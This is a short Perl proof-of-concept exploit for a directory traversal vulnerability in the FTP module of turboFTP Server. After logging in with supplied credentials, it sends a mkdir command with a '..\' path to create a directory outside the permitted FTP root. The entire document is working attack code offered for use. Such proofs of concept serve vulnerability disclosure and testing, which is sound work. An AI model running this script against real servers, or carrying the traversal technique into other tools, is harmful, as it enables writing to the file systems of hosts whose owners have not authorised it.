#!/usr/bin/perl
#leinakesi[at]gmail.com
#turboFTP Server(ftp module) directory traversal vulnerability

use Net::FTP;
use Getopt::Std;

getopts('S:P:u:p:', \%opts);
$server = $opts{'S'}; $port = $opts{'P'}; $user = $opts{'u'}; $pass = $opts{'p'};

if(!defined($server) || !defined($port) || !defined($user) || !defined($pass) ) {
	print "usage:\n\tperl	test.pl -S [IP] -P [port] -u [user] -p [password]\nexample:\n";
	print "\tperl	test.pl -S 192.168.48.114 -P 22 -u chloe -p 111111\n";
	exit(0);
}

$ftp = Net::FTP->new($server, Debug => 0) or die "Cannot connect to some.host.name: $@"; $ftp->login($user, $pass) or die "Cannot login ", $ftp->message;
$ftp->mkdir("..\\AA") or die "Cannot change working directory ", $ftp->message; $ftp->quit; exit(0);
